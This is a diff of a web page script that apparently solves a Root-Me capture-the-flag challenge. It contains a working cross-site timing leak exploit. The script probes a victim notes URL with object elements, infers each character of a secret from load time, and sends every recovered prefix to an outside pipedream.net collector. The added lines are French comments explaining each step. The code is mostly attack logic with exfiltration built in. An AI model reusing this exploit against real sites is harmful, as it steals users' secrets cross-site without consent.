@@ -24,34 +24,48 @@
     </script> -->
     <script defer="">
         fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?presence=JeSuisLa`)
+        //Tout les caractères pour trouver le flag
         let alpha = `abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_+=`
-        let flag = "zc4r3_4b0ut_+s4mes1t3_c00k1"
+        //variable dans laqulle le flag sera stockée
+        let flag = "zc4r3_4b0ut_+s4mes1t3_c00k13"
+        //L'endpoint dans lequel sera envoyé le flag
         let endpoint = "https://eoba3aqmrw0ajf6.m.pipedream.net/?flag="
         // let victime = "https://web-client-ch56.challenge01.root-me.org:58056/notes/392/"
 
-
+        /*
+        Fonction récursive permettant de leak le flag
+        */
         function leak(url, i) {
-            // declaration du script
+            // avec la balise object j'envoie une demande ressource avec la combinaison pour trouver le flag
             let s = document.createElement('object')
+            //attache l'url avec le flag si la moitié est déja trouvé
             s.data = `${url}${encodeURIComponent(flag)}${encodeURIComponent(alpha[i])}`
 
-
+            //création de la variable de calcule de temps
             var start = performance.now()
 
+            //si la demande de ressource est sur le bon id le onload est trigger
             s.onload = (e) => {
+                //on calcule le temps que la demande de ressource aura mis
                 var time = performance.now() - start;
                 console.log("The request took %d ms.", time);
+                //si le temps de la requête est surpérieur ou égale à 2 secondes
                 if (time >= 2000) {
+                    //On ajoute la lettre trrouvé au flag
                     flag = flag + alpha[i]
+                    //ensuite on envoie la lettre à l'endpoint
                     fetch(`${endpoint}${encodeURIComponent(flag)}`)
+                    //On recommence le processus si le caractère est trouvé
                     leak(url, 0)
                 } else if (i < alpha.length - 1) {
+                    //dans le cas contraire on passe au teste d'un autre caractère
                     leak(url, i + 1)
                 }
                 e.target.remove()
             }
             document.body.appendChild(s)
         }
+        //première éxecution de la fonction
         leak("https://web-client-ch56.challenge01.root-me.org:58056/notes/392/", 0)
 
 
@@ -59,7 +73,8 @@
 
 
 
-
+        //Fonction permettant de brutforce l'id de la note de l'admin
+        
         // const leak = async (url, id) => {
         //     return new Promise((r) => {
         //         let s = document.createElement('script')
